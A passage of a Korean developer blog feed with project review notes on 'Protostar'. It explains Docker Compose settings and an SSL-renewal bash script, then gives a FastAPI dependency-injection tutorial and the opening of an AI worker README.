  <li>중앙집중형 관제 시스템
    <ul>
      <li>Prometheus 의 Pull 방식과 함께 Promtail을 통해 Loki 기반의 서버 어플리케이션들의 로그를 수집하도록 했음</li>
      <li>통합 대시보드를 통해 서버들의 상태, 관리의 중앙 집중구조를 구현함.</li>
    </ul>
  </li>
  <li>AI 서비스를 위한 최적화 데이터베이스 구현
    <ul>
      <li>pgvector 확장을 위하여 init.spl에서 확장기능을 활성화 시켜 벡터 DB 기능을 사용하였다. 별도의 벡터 DB 가 아닌, RDBMS 인프라 내에서 임베딩 벡터를 저장, 검색함으로써 관리 복잡도를 줄여줌</li>
    </ul>
  </li>
</ol>

<h2 id="구체적인-구성요소-해석">구체적인 구성요소 해석</h2>
<h3 id="docker">Docker</h3>
<h4 id="include">include</h4>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># protostar-server-configs/docker-compose.yml</span>
<span class="na">include</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">./main-server/docker-compose.yml</span>
    <span class="na">env_file</span><span class="pi">:</span> <span class="s">./main-server/.env</span>
  <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">./sub-server/docker-compose.yml</span>
    <span class="na">env_file</span><span class="pi">:</span> <span class="s">./sub-server/.env</span>
</code></pre></div></div>

<pre><code class="language-plain">COMPOSE_PROFILES="main"
</code></pre>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># protostar-server-configs/main-server/docker-compose.yml</span>
<span class="na">services</span><span class="pi">:</span>
  <span class="na">nginx-main</span><span class="pi">:</span>
    <span class="na">profiles</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">main"</span><span class="pi">]</span> 
    <span class="na">container_name</span><span class="pi">:</span> <span class="s">${DOMAIN:-main}-nginx</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s">nginx:alpine</span>
    <span class="na">ulimits</span><span class="pi">:</span>
      <span class="na">nofile</span><span class="pi">:</span>
        <span class="na">soft</span><span class="pi">:</span> <span class="m">65535</span>
        <span class="na">hard</span><span class="pi">:</span> <span class="m">65535</span>
    <span class="na">ports</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">80:80"</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">443:443"</span>
    <span class="na">volumes</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s">./nginx/nginx_target.conf:/etc/nginx/nginx.conf</span>
        <span class="s">.</span>
        <span class="s">.</span>
        <span class="s">.</span>
        <span class="s">(생략)</span>
</code></pre></div></div>
<ul>
  <li>기존의 모놀리식 설정 파일을 팀별/ 기능별  쪼개서 관리하기 위한 목적의 명령어</li>
  <li>기존에는 <code class="language-plaintext highlighter-rouge">-f docker-compose.yml</code>  이렇게 별도로 파일을 지정하여 설정을 실행함. 하지만 <code class="language-plaintext highlighter-rouge">include</code>는 파일 내부에 선언적으로 설정함. <code class="language-plaintext highlighter-rouge">.env</code> 등의 환경 설정을 통해, 키워드를 설정하고, 이를 통해  세부 docker-compose.yml 파일에서 <code class="language-plaintext highlighter-rouge">profiles</code> 키워드를 찾아서 그 내용을 실행하게 만듬.</li>
  <li>왜 <code class="language-plaintext highlighter-rouge">include</code> 는 강력한가?
    <ol>
      <li>상대 경로 독립성 보장 :
        <ul>
          <li>기존 <code class="language-plaintext highlighter-rouge">-f</code> 옵션 방식은 루트 디렉토리 기준 상대경로가 꼬일 수 있음.</li>
          <li>해당 명령을 통해선 프로필로 직접 해석하기 때문에, 루트 디렉토리 기준 꼬이지 않고 동작하며, <code class="language-plaintext highlighter-rouge">main-server</code> 라는 부분만 옯겨도 수정 없이 바로 사용이 가능하다.</li>
        </ul>
      </li>
      <li>환경 변수 스코프 분리 :
        <ul>
          <li>만약 모놀리식에 하나의 <code class="language-plaintext highlighter-rouge">.env</code> 형태라고 치자, 물리적으로 나뉜 설정이 혼재되고 관리하기 어려워진다.</li>
          <li>이에비하면 <code class="language-plaintext highlighter-rouge">main-server</code>, <code class="language-plaintext highlighter-rouge">sub-server</code>는 각각 <code class="language-plaintext highlighter-rouge">.env</code> 파일을 지정할수 있고, 관리 면에서 물리적인 분리로, 변수 이름 충돌 등의 문제가 발생하지 않게 됨.</li>
        </ul>
      </li>
      <li>단일 진입점
        <ul>
          <li>물리적으로 설정이 완벽하게 분리되지만, 동시에 하나의 진입점에서 명령어를 친다는 점은 관리가 매우 편리함.</li>
          <li>개발자는 메인 <code class="language-plaintext highlighter-rouge">.env</code>의 키워드만 바꿔줌으로써 전체 아키텍쳐 안에서 필요한 환경만 한번에 불러올 수 있음.
            <h4 id="restart-정책---always-vs-unless-stopped">restart 정책  : <code class="language-plaintext highlighter-rouge">always</code> vs <code class="language-plaintext highlighter-rouge">unless-stopped</code></h4>
            <h5 id="1-restart-always-좀비-모드">1. <code class="language-plaintext highlighter-rouge">restart: always</code> (좀비 모드)</h5>
          </li>
        </ul>
      </li>
    </ol>
  </li>
  <li><strong>동작:</strong> 컨테이너가 멈추면 무조건 다시 살려냄.</li>
  <li><strong>수동 종료 시:</strong> <code class="language-plaintext highlighter-rouge">docker stop</code>으로 멈춰도, 도커 데몬이 재시작되거나(예: 서버 재부팅) 하면 <strong>다시 살아난다.</strong></li>
  <li><strong>특징:</strong> 개발자가 “이제 그만 죽어 있어”라고 명령해도, 컴퓨터를 껐다 켜면 “짜잔” 하고 다시 살아난다. 무조건 켜져 있어야 하는 핵심 데몬에 적합하다.</li>
</ul>

<h5 id="2-restart-unless-stopped-매너-모드">2. <code class="language-plaintext highlighter-rouge">restart: unless-stopped</code> (매너 모드)</h5>

<ul>
  <li><strong>동작:</strong> <code class="language-plaintext highlighter-rouge">always</code>와 똑같이 컨테이너가 죽으면 살려내지만, <strong>“명시적으로 멈춘 상태”는 존중</strong>.</li>
  <li><strong>수동 종료 시:</strong> <code class="language-plaintext highlighter-rouge">docker stop</code>으로 멈춘 상태에서 서버를 재부팅하면, <strong>계속 멈춰 있다.</strong> (되살아나지 않음)</li>
  <li><strong>특징:</strong> “내가 껐으면 끈 거야”라는 의도를 기억한다. 유지보수를 위해 잠시 꺼둔 DB나 서비스를 재부팅 후에도 꺼진 채로 유지하고 싶을 때 유용</li>
</ul>

<p>결론적으로, 이러한 특성 때문에 온프레미스 환경에서 운영중이고 유지보수나 점검을 해야할 때 멋데로 다시 켜지거나 하여 충돌, 데이터 오염을 최소화 하고자, 개발자의 의도를 최우선으로 삼았기 때문에 모든 아키텍쳐는 <code class="language-plaintext highlighter-rouge">unless-stopped</code> 로 설정 되어 있음</p>

<h4 id="deployresourceslimits-vs-deployresourcsreservations">deploy.resources.limits vs deploy.resourcs.reservations</h4>

<ol>
  <li>Limits : 컨테이너의 사용 가능한 자원의 최대치를 제한을 건다. 특정 컨테이너가 과도한 리소스 점유를 방지하는 역할</li>
  <li>Resrvations : 컨테이너 구동에 필요한 최소한의 자원을 예약하거나, 자원 부족 시 우선순위를 결정하는 기준이 됨.
    <ol>
      <li>메모리의 경우, 평소엔 limits 까지 쓰이지만, reservations 설정이 있으면, host 의 메모리 부족 시 <code class="language-plaintext highlighter-rouge">reservations</code>의 값을 기반으로 컨테이너의 메모리 먼저 회수, 종료 함으로써 최소 사양으로 돌아가고 살아 있지만, 그 외의 리소스는 최대한 외부의 서비스가 쓸 수 있도록 제공해주는 역할을 함.</li>
    </ol>
  </li>
</ol>

<h4 id="logging-설정">logging 설정</h4>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">.</span>
<span class="s">.</span>
<span class="s">.</span>
<span class="na">logging</span><span class="pi">:</span>
  <span class="na">driver</span><span class="pi">:</span> <span class="s2">"</span><span class="s">json-file"</span>
  <span class="na">options</span><span class="pi">:</span>
    <span class="na">max-size</span><span class="pi">:</span> <span class="s2">"</span><span class="s">10m"</span>
    <span class="na">max-file</span><span class="pi">:</span> <span class="s2">"</span><span class="s">3"</span>
    <span class="s">.</span>
    <span class="s">.</span>
    <span class="s">.</span>
</code></pre></div></div>

<ul>
  <li>Docker 컨테이너의 로그가 무한정 커질 수 있으니, 로그의 로테이션을 설정함으로써 로깅을 제한을 걸기 위해 쓸 수 있다.</li>
  <li><code class="language-plaintext highlighter-rouge">driver: "json-file"</code> : 로깅하는 방식, 호스트 머신에 어떤 포맷으로 적용할지,</li>
  <li><code class="language-plaintext highlighter-rouge">max-size</code> : 최대치 설정</li>
  <li><code class="language-plaintext highlighter-rouge">max-file</code> : 최대 파일 개수, 설정 만큼 파일이 차고 용량 역시 정한 만큼 넘어가면, 가장 오래된 로그는 삭제한다.</li>
  <li><code class="language-plaintext highlighter-rouge">node-exporter</code> , <code class="language-plaintext highlighter-rouge">cadvisor</code> 같은 모니터링에 적용된다. 이유는 간단하다. 여기서의 수집되는 데이터들이 Grafana에 모이고 있기 때문에 물리적 파일 형태로 갖추는 건 긴급한 상황 보기 위한 수준만 있으면 되고, 그 이상은 이미 Grafna 대시보드에 수집됨.</li>
</ul>

<h4 id="network-external">network ‘external’</h4>
<ul>
  <li>네트워크를 해당 <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> 에서 만들 수도 있다. 하지만 여러 컨테이너가 연결되어 있을 수 잇다보니, 또한 여러 컨테이너를 추가로 붙이는 경우에도 이렇게 설정하면 외부에 이미 되어 있으니 생성하라고 하지 않을 수 있으며, 당연히 네트워크 그룹으로 묶이니 소통이 편리해진다.</li>
  <li><strong>네트워크의 수명과 컨테이너의 분리</strong>
    <ol>
      <li>실수로 인한 고립 방지 : 기본 설정만 할 경우 네트워크가 자동 생성, 삭제된다.</li>
      <li>다른 프로젝트와의 연결 : 공용도로로 연결되기 때문에, 향후 다른 서비스를 별도로 붙이더라도 손쉽게 붙이기가 가능함.</li>
    </ol>
  </li>
</ul>

<h3 id="shell-script">Shell Script</h3>

<ul>
  <li>SSL인증서 갱신을 위하여 구현하였던 쉘 스크립트.</li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c">#!/bin/bash</span>

  <span class="c"># 1. 스크립트가 있는 '진짜' 폴더 위치 계산 (절대 경로)</span>
  <span class="nv">SCRIPT_DIR</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span> <span class="nb">cd</span> <span class="s2">"</span><span class="si">$(</span> <span class="nb">dirname</span> <span class="s2">"</span><span class="k">${</span><span class="nv">BASH_SOURCE</span><span class="p">[0]</span><span class="k">}</span><span class="s2">"</span> <span class="si">)</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">pwd</span> <span class="si">)</span><span class="s2">"</span>

  <span class="c"># 2. Crontab용 PATH 설정</span>
  <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

  <span class="c"># 에러 발생 시 멈춤</span>
  <span class="nb">set</span> <span class="nt">-e</span>

  <span class="nb">echo</span> <span class="s2">"========================================"</span>
  <span class="nb">echo</span> <span class="s2">"🚀 SSL Renewal Started at </span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2">"</span>
  <span class="nb">echo</span> <span class="s2">"   Target Dir: </span><span class="nv">$SCRIPT_DIR</span><span class="s2">"</span>
  <span class="nb">echo</span> <span class="s2">"========================================"</span>

  <span class="c"># --- [핵심] 환경 감지 로직 (COMPOSE_PROFILES 활용) ---</span>
  <span class="c"># .env 파일을 읽어서 COMPOSE_PROFILES 변수에 'main'이 포함되어 있는지 확인합니다.</span>

  <span class="nv">ENV_FILE</span><span class="o">=</span><span class="s2">"</span><span class="nv">$SCRIPT_DIR</span><span class="s2">/.env"</span>

  <span class="c"># .env 파일 로드 (변수 불러오기)</span>
  <span class="k">if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$ENV_FILE</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
      </span><span class="nb">source</span> <span class="s2">"</span><span class="nv">$ENV_FILE</span><span class="s2">"</span>
  <span class="k">fi</span>

  <span class="c"># COMPOSE_PROFILES 변수 확인 (메인 서버인지 판단)</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$COMPOSE_PROFILES</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"main"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
      </span><span class="nb">echo</span> <span class="s2">"&gt;&gt; Detected Environment: Main Server (A5) (Profile: </span><span class="nv">$COMPOSE_PROFILES</span><span class="s2">)"</span>
      <span class="nv">CERTBOT_SVC</span><span class="o">=</span><span class="s2">"certbot-main"</span>
      <span class="nv">NGINX_SVC</span><span class="o">=</span><span class="s2">"nginx-main"</span>
  <span class="k">else
      </span><span class="nb">echo</span> <span class="s2">"&gt;&gt; Detected Environment: Standard/Sub Server (Profile: </span><span class="k">${</span><span class="nv">COMPOSE_PROFILES</span><span class="k">:-</span><span class="nv">none</span><span class="k">}</span><span class="s2">)"</span>
      <span class="nv">CERTBOT_SVC</span><span class="o">=</span><span class="s2">"certbot"</span>
      <span class="nv">NGINX_SVC</span><span class="o">=</span><span class="s2">"nginx"</span>
  <span class="k">fi

  </span><span class="nb">echo</span> <span class="s2">"   Target Services -&gt; Certbot: </span><span class="nv">$CERTBOT_SVC</span><span class="s2"> / Nginx: </span><span class="nv">$NGINX_SVC</span><span class="s2">"</span>
  <span class="nb">echo</span> <span class="s2">"========================================"</span>

  <span class="c"># 3. Docker Compose 실행 (공통 변수 사용)</span>
  <span class="nv">DC_CMD</span><span class="o">=</span><span class="s2">"docker compose --project-directory </span><span class="nv">$SCRIPT_DIR</span><span class="s2"> --env-file </span><span class="nv">$ENV_FILE</span><span class="s2">"</span>

  <span class="nb">echo</span> <span class="s2">"[Step 1] Certbot Renew..."</span>
  <span class="nv">$DC_CMD</span> run <span class="nt">--rm</span> <span class="s2">"</span><span class="nv">$CERTBOT_SVC</span><span class="s2">"</span> renew

  <span class="nb">echo</span> <span class="s2">"[Step 2] Nginx Reload..."</span>
  <span class="nv">$DC_CMD</span> <span class="nb">exec</span> <span class="s2">"</span><span class="nv">$NGINX_SVC</span><span class="s2">"</span> nginx <span class="nt">-s</span> reload

  <span class="nb">echo</span> <span class="s2">"========================================"</span>
  <span class="nb">echo</span> <span class="s2">"✅ SSL Renewal Completed!"</span>
  <span class="nb">echo</span> <span class="s2">"========================================"</span>
</code></pre></div></div>

<ol>
  <li><code class="language-plaintext highlighter-rouge">crontab</code>으로 스케줄링을 걸면, 실행 위치가 엉뚱한 곳이 될 수 있음. <code class="language-plaintext highlighter-rouge">.env</code>와 <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> 를 정확히 찾기 위한 장치가 필요하여 스크립트 위치를 계산한다.</li>
  <li><code class="language-plaintext highlighter-rouge">cron</code> 환경은 일반 사용자 쉘과는 다름. 따라서 <code class="language-plaintext highlighter-rouge">PATH</code>가 최소 지정으로 <code class="language-plaintext highlighter-rouge">docker</code> 명령어를 못찾을 수 있어서 지정해주는게 안전한 실행을 발생 시킴</li>
  <li><code class="language-plaintext highlighter-rouge">if [조건]; then [실행할 명령]; fi</code> : 조건문</li>
  <li><code class="language-plaintext highlighter-rouge">[[ ... ]]</code> : 확장 테스트 명령, 일반 <code class="language-plaintext highlighter-rouge">[ ... ]</code> 에서 <code class="language-plaintext highlighter-rouge">==</code> 우측에 와일드카드를 써도 패턴 매칭안되고 단순 문자열 취급. ‘패턴매칭’ 이 동작하고, 키워드가 맞는지 검사하는게 된다.</li>
  <li>결과적으로 if 문을 통해 환경을 파악하고, 적용해야하는 컨테이너 이름들의 값을 확정지은다.</li>
  <li><code class="language-plaintext highlighter-rouge">DC_CMD="~"</code> 명령어도 변수로 담아 둘 수 있으며, 이를 통해 반복 입력을 최소화한다.</li>
  <li>결론
    <ol>
      <li>이 스크립트는 환경 인식을 통한 코드 중복을 제거하여, 스크립트를 여러개 만들지 않는 구조를 채택함</li>
      <li>Cron 환경을 고려하여 환경변수, 현재 위치 등을 파악하고, 먼저 안전하게 수행하도록 함.</li>
      <li><code class="language-plaintext highlighter-rouge">nginx -s reload</code> 등, 마지막 부분에서는 인증서 갱신이 되더라도 안정적이고, 트래픽이 끊기지 않게 만들고자 reload 를 사용함으로써 무중단 운영이 되도록 신경을 썼다.</li>
    </ol>
  </li>
</ol>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><category term="Protostar" /><category term="Project" /><category term="Review" /><summary type="html"><![CDATA[핵심 특징 5가지 물리적 / 논리적 망 분리 : 서비스 존과 매니징 존을 분리하였고, 이를 통한 운영 안정성을 확보함. 트래픽 제어를 위한 Nginx 레이어에서의 Traffic Dam : 토큰 버킷 알고리즘 기반의 트래픽 제어 Heavy Zone, Light Zone 으로 구분하여서 매크로성을 엄격히 막아야 하는 위치(Backend), 정적 리소스 로딩을 위한 일반 존(Frontend)로 구분하여 로딩속성과 백엔드 서비스 보호를 양립함. 투명한 IP 보존(L4, L7 Proxy Protocol) 두대의 서버, 한대의 공유기의 네트워크 환경에서 클라이언트의 원본 IP 를 추적하기 위함, 동시에 각 서버의 HTTPS 접속을 구현함으로서 서비스 서버와 메인터넌스 서버에 접속하는 루트를 분리. 이를 통한 서비스 서버의 문제가 발생하더라도, 이를 모니터링하는 서버의 접속은 문제 없도록 만들어냄 중앙집중형 관제 시스템 Prometheus 의 Pull 방식과 함께 Promtail을 통해 Loki 기반의 서버 어플리케이션들의 로그를 수집하도록 했음 통합 대시보드를 통해 서버들의 상태, 관리의 중앙 집중구조를 구현함. AI 서비스를 위한 최적화 데이터베이스 구현 pgvector 확장을 위하여 init.spl에서 확장기능을 활성화 시켜 벡터 DB 기능을 사용하였다. 별도의 벡터 DB 가 아닌, RDBMS 인프라 내에서 임베딩 벡터를 저장, 검색함으로써 관리 복잡도를 줄여줌]]></summary></entry><entry><title type="html">Protostar review note - 00 - FastAPI intro</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/10/02-protostar-review.html" rel="alternate" type="text/html" title="Protostar review note - 00 - FastAPI intro" /><published>2026-02-10T00:00:00+00:00</published><updated>2026-02-10T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/10/02-protostar-review</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/10/02-protostar-review.html"><![CDATA[<h1 id="fastapi-개념-정리">FastAPI 개념 정리</h1>
<ul>
  <li>현대적, 성능이 뛰어난 웹 프레임워크 서버</li>
  <li>RESTFul API 를 구축하는데 최적화, 3.14의 멀티코어 병렬 처리와 uv 같은 고속 툴 체인을 결합하여 백엔드 개발의 표준 방식으로 자리 잡게됨.
    <h2 id="핵시-철학-및-특징">핵시 철학 및 특징</h2>
  </li>
  <li>고성능: 웹엔진(Starlette), 데이터 검증(Pydantic)</li>
  <li>빠른 개발 속도: 파이썬의 <code class="language-plaintext highlighter-rouge">Type Hints</code>를 활용해 코딩 시간을 획기적으로 줄임.</li>
  <li>자동 문서화: 별도 작업 없이 Swagger UI 와 ReDoc을 통해 대화형 API 문서를 생성함.</li>
  <li>데이터 검증 및 직렬화: JSON 데이터를 파이썬 객체로 자동 변환, 타입에러를 통한 안정성 확보</li>
</ul>

<h2 id="기술-근간">기술 근간</h2>
<p>|**구성 요소**|**역할**|
|—|—|
|**Starlette**|가볍고 빠른 ASGI 프레임워크로, 라우팅, 웹소켓, 미들웨어 등 핵심 웹 기능을 담당합니다.|
|**Pydantic**|파이썬 타입 힌트를 기반으로 데이터 검증(Validation)과 설정 관리(Serialization)를 수행합니다.|
|**Uvicorn / uv**|비동기 서버(ASGI)로, FastAPI 애플리케이션을 실행하는 엔진 역할을 합니다.|</p>
<ul>
  <li>ASGI(Asynchronous Server Gateway Interface): Python 비동기 웹 표준. WSGI(Sync)와 달리 async/await 지원으로 고성능 웹앱 가능
    <ul>
      <li>라우팅 / 미들웨어 / 요청, 응답 처리 / 라이프 사이클 관리 역할을 함</li>
    </ul>
  </li>
  <li>pydantic: 타입힌트를 기반 검증, 파싱 라이브러리
    <ul>
      <li>python dataclass 확장, Json -&gt; python 객체 자동 변환 + 검증 역할</li>
      <li>FastAPI 연계될 때는
        <ul>
          <li>Path/Query/Form 모델: 함수 인자로 사용, 자동 파싱 / 검증</li>
          <li>Response 모델: 출력 스키마를 정의 하며 자동 생성해줌</li>
          <li>Validator / Field 커스텀: 각종 데코레이터, Field 로 입력을 수신해줌.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h2 id="주요-개념-및-동작-로직">주요 개념 및 동작 로직</h2>
<ol>
  <li>비동기 처리(Async / Await)</li>
  <li>의존성 주입: 함수를 할당해두고 Annotated와 Depends 를 활용해, 이를 추적해서 사용하도록 함으로써 코드 재사용성을 극대화함.</li>
  <li>타입 힌트 기반 검증</li>
  <li>애플리케이션 구조: 2026년 현재 도메인 주도 설계 적용, 비즈니스 로직의 서비스 레이어와 Router 레이어(HTTP 통신 수신)을 분리하는 방식이 권장 됨.</li>
</ol>

<h2 id="프레임-워크">프레임 워크</h2>

<table>
  <thead>
    <tr>
      <th style="text-align: center">**구분**</th>
      <th style="text-align: left">**Django**</th>
      <th style="text-align: left">**Flask**</th>
      <th style="text-align: left">**FastAPI**</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">**성격**</td>
      <td style="text-align: left">Batteries-included (모든 기능 포함)</td>
      <td style="text-align: left">Micro-framework (최소 기능)</td>
      <td style="text-align: left">Modern API-first (현대적 API 특화)</td>
    </tr>
    <tr>
      <td style="text-align: center">**성능**</td>
      <td style="text-align: left">상대적으로 무거움</td>
      <td style="text-align: left">보통 (동기 위주)</td>
      <td style="text-align: left">**매우 빠름 (비동기)**</td>
    </tr>
    <tr>
      <td style="text-align: center">**주요 용도**</td>
      <td style="text-align: left">대규모 웹 서비스, 관리자 페이지</td>
      <td style="text-align: left">소규모 프로토타입</td>
      <td style="text-align: left">**마이크로서비스, AI 모델 서빙**</td>
    </tr>
    <tr>
      <td style="text-align: center">**데이터 검증**</td>
      <td style="text-align: left">Forms / Serializers 사용</td>
      <td style="text-align: left">수동 설정 필요</td>
      <td style="text-align: left">**자동 (Pydantic)**</td>
    </tr>
  </tbody>
</table>

<hr />
<h1 id="의존성-주입-세부적으로-알아보기">의존성 주입 세부적으로 알아보기</h1>

<h3 id="함수-의존성-예시-코드">함수 의존성 예시 코드</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">from</span> <span class="n">typing</span> <span class="kn">import</span> <span class="n">Annotated</span>
  <span class="kn">from</span> <span class="n">fastapi</span> <span class="kn">import</span> <span class="n">Depends</span><span class="p">,</span> <span class="n">FastAPI</span>

  <span class="n">app</span> <span class="o">=</span> <span class="nc">FastAPI</span><span class="p">()</span>

  <span class="c1"># 1. 의존성(Dependable) 함수 정의
</span>  <span class="c1"># 공통적으로 사용할 로직을 일반 함수(또는 async 함수)로 만듭니다.
</span>  <span class="k">async</span> <span class="k">def</span> <span class="nf">common_parameters</span><span class="p">(</span><span class="n">q</span><span class="p">:</span> <span class="nb">str</span> <span class="o">|</span> <span class="bp">None</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span> <span class="n">skip</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">limit</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">100</span><span class="p">):</span>
      <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">q</span><span class="sh">"</span><span class="p">:</span> <span class="n">q</span><span class="p">,</span> <span class="sh">"</span><span class="s">skip</span><span class="sh">"</span><span class="p">:</span> <span class="n">skip</span><span class="p">,</span> <span class="sh">"</span><span class="s">limit</span><span class="sh">"</span><span class="p">:</span> <span class="n">limit</span><span class="p">}</span>

  <span class="c1"># 2. 경로 함수(Path Operation)에 주입
</span>  <span class="c1"># Annotated를 사용하여 반환 타입(dict)과 의존성 선언(Depends)을 결합합니다.
</span>  <span class="nd">@app.get</span><span class="p">(</span><span class="sh">"</span><span class="s">/items/</span><span class="sh">"</span><span class="p">)</span>
  <span class="k">async</span> <span class="k">def</span> <span class="nf">read_items</span><span class="p">(</span><span class="n">commons</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="nb">dict</span><span class="p">,</span> <span class="nc">Depends</span><span class="p">(</span><span class="n">common_parameters</span><span class="p">)]):</span>
      <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Items list</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">params</span><span class="sh">"</span><span class="p">:</span> <span class="n">commons</span><span class="p">}</span>

  <span class="nd">@app.get</span><span class="p">(</span><span class="sh">"</span><span class="s">/users/</span><span class="sh">"</span><span class="p">)</span>
  <span class="k">async</span> <span class="k">def</span> <span class="nf">read_users</span><span class="p">(</span><span class="n">commons</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="nb">dict</span><span class="p">,</span> <span class="nc">Depends</span><span class="p">(</span><span class="n">common_parameters</span><span class="p">)]):</span>
      <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Users list</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">params</span><span class="sh">"</span><span class="p">:</span> <span class="n">commons</span><span class="p">}</span>
</code></pre></div></div>

<h3 id="리소스-관리를-위한-의존성-예시-코드">리소스 관리를 위한 의존성 예시 코드</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">from</span> <span class="n">typing</span> <span class="kn">import</span> <span class="n">Annotated</span>
  <span class="kn">from</span> <span class="n">fastapi</span> <span class="kn">import</span> <span class="n">Depends</span><span class="p">,</span> <span class="n">FastAPI</span>

  <span class="n">app</span> <span class="o">=</span> <span class="nc">FastAPI</span><span class="p">()</span>

  <span class="c1"># 데이터베이스 세션을 시뮬레이션하는 의존성
</span>  <span class="k">async</span> <span class="k">def</span> <span class="nf">get_db_session</span><span class="p">():</span>
      <span class="n">db</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Database Connection Created</span><span class="sh">"</span>
      <span class="k">try</span><span class="p">:</span>
          <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">연결 생성</span><span class="sh">"</span><span class="p">)</span>
          <span class="k">yield</span> <span class="n">db</span>  <span class="c1"># 엔드포인트 함수에 db 객체 전달
</span>      <span class="k">finally</span><span class="p">:</span>
          <span class="c1"># 엔드포인트 작업이 끝나면(성공/실패 상관없이) 실행됩니다.
</span>          <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">연결 종료 및 정리 로직 실행</span><span class="sh">"</span><span class="p">)</span>

  <span class="nd">@app.get</span><span class="p">(</span><span class="sh">"</span><span class="s">/db-task</span><span class="sh">"</span><span class="p">)</span>
  <span class="k">async</span> <span class="k">def</span> <span class="nf">perform_db_task</span><span class="p">(</span><span class="n">db</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nc">Depends</span><span class="p">(</span><span class="n">get_db_session</span><span class="p">)]):</span>
      <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">success</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">data</span><span class="sh">"</span><span class="p">:</span> <span class="n">db</span><span class="p">}</span>
</code></pre></div></div>

<h3 id="결론">결론</h3>
<ul>
  <li>FastAPI 의 의존성 부여는, NestJS나 Spring 에서 지향하듯 시스템에서 의존성을 관리해주는 형태는 아니다.</li>
  <li>오히려 특정 함수가 있고, 찾아서 쓰라는 식의 Raw 한 접근에 가깝다.</li>
  <li><strong>Request Lifecycle</strong>: 기본적으로 FastAPI는 <strong>하나의 HTTP 요청</strong> 안에서 같은 의존성이 여러 번 호출되면, 함수를 매번 실행하지 않고 <strong>처음 계산된 결과를 캐싱</strong>해서 돌려준다.(캐싱이 내장)
    <ul>
      <li><strong>재사용성</strong>: 예를 들어 <code class="language-plaintext highlighter-rouge">get_current_user</code>라는 의존성을 여러 함수가 참조해도, 실제 유저를 DB에서 찾는 로직은 한 요청당 딱 한 번만 실행된다.</li>
    </ul>
  </li>
</ul>

<hr />

<h1 id="protostar-fastapi-ai-worker">Protostar FastAPI (AI Worker)</h1>

<p><img src="https://img.shields.io/badge/Python-3.13+-3776AB?style=for-the-badge&amp;logo=python&amp;logoColor=white" alt="Python" />
<img src="https://img.shields.io/badge/FastAPI-0.122+-009688?style=for-the-badge&amp;logo=fastapi&amp;logoColor=white" alt="FastAPI" />
<img src="https://img.shields.io/badge/Redis-Job_Queue-DC382D?style=for-the-badge&amp;logo=redis&amp;logoColor=white" alt="Redis" />
<img src="https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&amp;logo=docker&amp;logoColor=white" alt="Docker" /></p>

<p><strong>Project Protostar</strong>의 두뇌 역할을 담당하는 AI Worker 서비스다. 
비동기 작업 큐(Redis Queue)를 기반으로 고성능 AI 추론, RAG(Retrieval-Augmented Generation) 파이프라인, 그리고 데이터 요약 작업을 병렬로 처리하도록 구조화 되어있다.</p>

